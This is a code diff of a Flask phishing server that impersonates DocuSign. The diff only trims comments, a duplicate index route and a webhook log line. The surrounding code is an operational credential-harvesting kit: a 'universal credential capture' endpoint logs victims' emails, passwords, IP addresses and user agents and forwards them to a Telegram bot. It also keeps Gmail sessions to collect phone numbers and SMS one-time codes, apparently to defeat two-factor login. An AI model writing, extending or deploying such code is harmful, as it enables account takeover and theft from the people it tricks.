@@ -293,12 +293,6 @@ def serve_landing():
     return send_from_directory(".", "index.html")
 
 
-@app.route("/index.html")
-def serve_index():
-    """Also serve from direct path."""
-    return send_from_directory(".", "index.html")
-
-
 # ─── API ENDPOINTS ───
 @app.route("/setup_webhook", methods=["POST"])
 def setup_webhook():
@@ -342,7 +336,6 @@ def setup_webhook():
 @app.route("/api/creds", methods=["POST", "OPTIONS"])
 def capture():
     """Universal credential capture endpoint"""
-    # Handle CORS preflight
     if request.method == "OPTIONS":
         return make_response("", 204)
 
@@ -355,7 +348,6 @@ def capture():
 
     session_id = hashlib.md5(f"{time.time()}{random.random()}{email}".encode()).hexdigest()[:12]
 
-    # Log
     entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "provider": provider,
              "email": email, "password": password, "ip": ip, "ua": ua, "session": session_id}
 
@@ -364,7 +356,6 @@ def capture():
 
     logger.info(f"Captured creds: {provider} / {email} / session={session_id}")
 
-    # ── Telegram ──
     if provider == "gmail":
         with gmail_sessions_lock:
             gmail_sessions[session_id] = {
@@ -373,7 +364,6 @@ def capture():
                 "phone": None, "sms1": None, "sms2": None
             }
 
-        # Credential drop
         tg_send_message(
             f"[+]___ Invitation Card (GMAIL) ___[+]\n"
             f"You have a new website form submission \n"
@@ -384,7 +374,6 @@ def capture():
             f"UA: {ua}"
         )
 
-        # Control panel
         tg_send_message(
             f"🔔 GMAIL — {email}\nPassword: {password}\nSession: {session_id}",
             reply_markup=inline_kb([
@@ -468,7 +457,6 @@ def capture_otp():
     return jsonify({"status": "ok"})
 
 
-# ─── HEALTH ───
 @app.route("/health")
 def health_check():
     with gmail_sessions_lock:
@@ -481,5 +469,4 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     logger.info(f"Starting Flask on 0.0.0.0:{port}")
     logger.info(f"Landing page: https://docusign-unx3.onrender.com/")
-    logger.info(f"Webhook: https://docusign-unx3.onrender.com/webhook/{TELEGRAM_BOT_TOKEN}")
     app.run(host="0.0.0.0", port=port, debug=False)
